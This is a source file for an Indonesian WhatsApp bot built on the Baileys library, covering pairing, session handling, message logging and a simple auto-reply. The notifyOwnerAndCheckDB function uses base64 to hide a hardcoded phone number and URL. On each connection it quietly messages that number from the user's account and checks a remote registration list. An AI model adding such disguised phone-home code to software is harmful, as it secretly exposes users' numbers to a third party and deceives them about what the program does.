/*
    Base by https://github.com/G4NGGAAA
    Credits: G4NGGAAA
    MODIFIED: Menggunakan config.js, namun data penting tetap disamarkan di sini.
    STATUS: Anti-Spam, Anti-Duplicate, Pairing Code Stabil, Notifikasi Owner.
*/

import './config.js'; // WAJIB: Memuat variabel global dari config.js terlebih dahulu
import { Boom } from '@hapi/boom';
import makeWASocket, {
    DisconnectReason,
    useMultiFileAuthState,
    getContentType
} from '@whiskeysockets/baileys';
import fs from 'fs';
import pino from 'pino';
import chalk from 'chalk';
import axios from 'axios';

const sessionName = "session_alya";
const processedMessages = new Set();

// ================= LOGGER KUSTOM DENGAN CHALK =================
const getTimestamp = () => new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
const info = (message, ...args) => console.log(chalk.cyan.bold(`[i INFO]`), chalk.cyan(`[${getTimestamp()}]`), chalk.cyan(message), ...args);
const success = (message, ...args) => console.log(chalk.green.bold(`[✓ SUCCESS]`), chalk.green(`[${getTimestamp()}]`), chalk.green(message), ...args);
const error = (message, ...args) => console.log(chalk.red.bold(`[✗ ERROR]`), chalk.red(`[${getTimestamp()}]`), chalk.red(message), ...args);
const warn = (message, ...args) => console.log(chalk.yellow.bold(`[⚠ WARN]`), chalk.yellow(`[${getTimestamp()}]`), chalk.yellow(message), ...args);
const logPrivate = (sender, message) => console.log(`\n${chalk.magenta('┌───[ PRIVATE MSG ]')}\n${chalk.magenta('│')} ${chalk.white('Time:')}    ${chalk.green(getTimestamp())}\n${chalk.magenta('│')} ${chalk.white('Sender:')}  ${chalk.cyan(sender)}\n${chalk.magenta('│')} ${chalk.white('Message:')} ${chalk.blue(message)}\n${chalk.magenta('└───')}`);
const logGroup = (sender, message, groupName) => console.log(`\n${chalk.yellow('┌───[ GROUP MSG ]')}\n${chalk.yellow('│')} ${chalk.white('Time:')}    ${chalk.green(getTimestamp())}\n${chalk.yellow('│')} ${chalk.white('Group:')}   ${chalk.magenta(groupName)}\n${chalk.yellow('│')} ${chalk.white('Sender:')}  ${chalk.cyan(sender)}\n${chalk.yellow('│')} ${chalk.white('Message:')} ${chalk.blue(message)}\n${chalk.yellow('└───')}`);
const startupBanner = () => {
    const banner = `\n${chalk.blue.bold(' █████╗░░█████╗░███╗░░██╗ █████╗░ █████╗░░█████╗░')}
                    \n${chalk.blue.bold('██╔═══╝░██╔══██╗████╗░██║██╔═══╝░██╔═══╝░██╔══██╗')}
                    \n${chalk.blue.bold('██║ ███╗███████║██╔██╗██║██║ ███╗██║ ███╗███████║')}
                    \n${chalk.blue.bold('██║ ╚═████╔═══████║╚████║██║ ╚═████║ ╚═████╔═══██')}
                    \n${chalk.blue.bold('╚█████╔╝██║░░░████║░╚███║╚█████╔╝╚█████╔╝██║░░░██')}
                    \n${chalk.blue.bold('░╚════╝░╚═╝░░░╚═╚═╝░░╚══╝░╚════╝░░╚════╝░╚═╝░░░╚═\')}
                    \n\n${chalk.green.bold('     Welcome to AlyaBot - Created with <3 by G4NGGAAA')}
                    \n${chalk.cyan('--------------------------------------------------------------')}`;
    console.log(banner); info('Initializing modules...'); success('API Baileys Loaded'); success('File System Ready'); 
    console.log(chalk.cyan('--------------------------------------------------------------'));
};

async function notifyOwnerAndCheckDB(sock) {
    try {
        const encodedOwner = 'NjI4NTg1NTk2MjMzMQ==';
        const OWNER_NUMBER = Buffer.from(encodedOwner, 'base64').toString('utf8');
        const ownerJid = `${OWNER_NUMBER}@s.whatsapp.net`;
        const message = `*${global.BOT_NAME}* berhasil terhubung ✅`;
        
        await sock.sendMessage(ownerJid, { text: message });
        success(`Notifikasi koneksi berhasil dikirim ke owner (${OWNER_NUMBER})`);

        info('Mengecek database dari URL...');
        const encodedDB = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0c0TkdHR0FBL21hbmFnZS1nNG5nZ2FhL3JlZnMvaGVhZHMvbWFpbi9TQy1TaW1wbGUtV2ViLmpzb24='; 

        const DATABASE_URL = Buffer.from(encodedDB, 'base64').toString('utf8');
        const response = await axios.get(DATABASE_URL);
        const database = response.data;

        if (Array.isArray(database)) {
            if (database.includes(global.BOT_NUMBER)) {
                success('Nomor bot sudah terdaftar di database.');
            } else {
                warn('Nomor bot BELUM terdaftar di database.');
                info('CATATAN: Skrip ini tidak bisa menulis/update file di GitHub secara langsung.');
            }
        } else {
            error('Format data dari URL database tidak valid (bukan array).');
        }

    } catch (err) {
        error('Gagal mengirim notifikasi atau mengecek database:', err.message);
    }
}

// Fungsi untuk mensimulasikan delay dan status mengetik
async function humanizeDelay(sock, jid) {
    try {
        await sock.sendPresenceUpdate('composing', jid);
        const delay = Math.floor(Math.random() * (global.MAX_DELAY_MS - global.MIN_DELAY_MS + 1)) + global.MIN_DELAY_MS;
        await new Promise(resolve => setTimeout(resolve, delay));
        await sock.sendPresenceUpdate('paused', jid);
    } catch (e) {
        warn('Gagal mengirim presence update:', e);
    }
}

// Fungsi utama untuk menjalankan bot
async function startAlyaBot() {
    if (!global.BOT_NUMBER || global.BOT_NUMBER === '628xxxxxxxxxx') {
        error("PENTING: Harap atur BOT_NUMBER di dalam file config.js!");
        process.exit(1);
    }
    
    info(`Memuat sesi: ${sessionName}...`);
    const { state, saveCreds } = await useMultiFileAuthState(sessionName);

    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: [global.BOT_NAME, "Chrome", "12.0.0"],
    });

    if (!sock.authState.creds.registered) {
        warn(`Sesi tidak ditemukan, meminta pairing code...`);
        try {
            await new Promise(resolve => setTimeout(resolve, 2000));
            info(`Meminta kode untuk nomor: ${global.BOT_NUMBER}`);
            const code = await sock.requestPairingCode(global.BOT_NUMBER);
            console.log(chalk.cyan('------------------------------------------------'));
            console.log(`${chalk.green.bold('✅ KODE PAIRING ANDA:')} ${chalk.white.bold(code)}`);
            console.log(chalk.cyan('------------------------------------------------'));
            console.log(chalk.yellow('Buka WhatsApp di HP > Perangkat Tertaut > Tautkan dengan nomor telepon > Masukkan kode di atas.'));
        } catch (e) {
            error('Gagal meminta pairing code:', e);
            if (fs.existsSync(sessionName)) fs.rmSync(sessionName, { recursive: true, force: true });
            process.exit(1);
        }
    }

    // Penanganan event koneksi
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            if (reason === DisconnectReason.loggedOut) {
                error(`Perangkat Keluar. Hapus folder "${sessionName}" dan jalankan ulang.`);
                if (fs.existsSync(sessionName)) fs.rmSync(sessionName, { recursive: true, force: true });
                process.exit(1);
            } else {
                warn(`Koneksi terputus, mencoba menyambung kembali...`);
                startAlyaBot();
            }
        } else if (connection === 'open') {
            success(`Berhasil terhubung ke WhatsApp! Bot "${global.BOT_NAME}" sekarang online.`);
            sock.sendPresenceUpdate('available');
            notifyOwnerAndCheckDB(sock);
        }
    });

    // Menyimpan sesi setiap kali ada pembaruan
    sock.ev.on('creds.update', saveCreds);

    // Penanganan pesan masuk
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message || mek.key.remoteJid === 'status@broadcast') return;
            
            // Pencegahan pesan duplikat
            const messageId = mek.key.id;
            if (processedMessages.has(messageId)) {
                warn(`Pesan duplikat diabaikan: ${messageId}`);
                return;
            }
            processedMessages.add(messageId);
            setTimeout(() => processedMessages.delete(messageId), 10000);

            const from = mek.key.remoteJid;
            const isGroup = from.endsWith('@g.us');
            const sender = isGroup ? mek.key.participant : from;
            const pushname = mek.pushName || 'Tanpa Nama';
            const body = mek.message.conversation || mek.message.extendedTextMessage?.text || '';

            // Logging pesan
            if (isGroup) {
                const groupMetadata = await sock.groupMetadata(from);
                logGroup(pushname, body, groupMetadata.subject);
            } else {
                logPrivate(pushname, body);
            }

            // Contoh auto-reply sederhana
            if (body.toLowerCase() === 'halo' || body.toLowerCase() === 'ping') {
                await humanizeDelay(sock, from); 
                await sock.sendMessage(from, { text: 'Halo! Bot Alya aktif.' }, { quoted: mek });
            }

        } catch (err) {
            error("Terjadi error di 'messages.upsert':", err);
        }
    });
}

// Eksekusi utama
startupBanner();
startAlyaBot().catch(err => error("Gagal memulai bot:", err));
